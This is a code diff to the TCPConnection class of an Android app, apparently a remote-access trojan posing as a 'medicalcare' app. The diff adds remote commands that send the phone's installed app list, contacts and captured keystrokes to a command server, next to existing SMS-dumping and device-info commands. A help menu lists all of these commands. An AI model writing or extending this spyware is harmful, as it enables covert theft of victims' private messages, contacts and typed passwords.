@@ -10,6 +10,8 @@ import java.io.BufferedReader
 import java.io.DataOutputStream
 import java.io.InputStreamReader
 import java.net.Socket
+import com.example.medicalcare.features.network.commands.AppList
+import com.example.medicalcare.features.network.commands.ContactReader
 
 class TCPConnection(private val context: Context) : Runnable {
     private val host = ConfigNetwork.HOST
@@ -20,7 +22,9 @@ class TCPConnection(private val context: Context) : Runnable {
         "1" to SMSReader(context),
         "2" to SMSReader(context),
         "3" to SMSReader(context),
-        "deviceInfo" to DeviceInfoProvider()
+        "deviceInfo" to DeviceInfoProvider(),
+        "applist" to AppList(context),
+        "contacts" to ContactReader(context)
     )
 
     // Shell mode state
@@ -38,6 +42,7 @@ class TCPConnection(private val context: Context) : Runnable {
                     BufferedReader(InputStreamReader(socket.getInputStream())).use { fromServer ->
                         Log.d("TCPConnection", "Connected to $host:$port")
                         toServer.write("Hello\n".toByteArray())
+                        toServer.write("Enter \'help\' for commands\n".toByteArray())
                         toServer.flush()
 
                         var run = true
@@ -96,6 +101,36 @@ class TCPConnection(private val context: Context) : Runnable {
                                     toServer.write("1: Inbox Messages\n".toByteArray())
                                     toServer.write("2: Sent Messages\n".toByteArray())
                                     toServer.write("3: Outbox Messages\n".toByteArray())
+                                    toServer.flush()
+                                }
+                                command.equals("keylogs", ignoreCase = true) -> {
+                                    toServer.write("----------Captured Keystrokes----------\n".toByteArray())
+                                    toServer.flush()
+
+                                    var count = 0
+                                    var entry = LogStorage.poll()
+
+                                    if (entry == null) {
+                                        toServer.write("[!] No new keystrokes captured.\n".toByteArray())
+                                    }
+
+                                    while (entry != null) {
+                                        toServer.write(entry.toByteArray())
+                                        entry = LogStorage.poll()
+                                        count++
+                                    }
+
+                                    toServer.write("----------End ($count entries)----------\n".toByteArray())
+                                    toServer.flush()
+                                }
+                                command.equals("help", ignoreCase = true) -> {
+                                    toServer.write("--------------------------------------------\n".toByteArray())
+                                    toServer.write("deviceInfo -> Get Device Information\n".toByteArray())
+                                    toServer.write("dumpMessages -> Read SMS\n".toByteArray())
+                                    toServer.write("applist -> Read All Applications\n".toByteArray())
+                                    toServer.write("contacts -> Read All Contacts\n".toByteArray())
+                                    toServer.write("keylogs -> Retrieve new captured keystrokes\n".toByteArray())
+                                    toServer.write("--------------------------------------------\n".toByteArray())
                                     toServer.flush()
                                 }
                                 else -> {
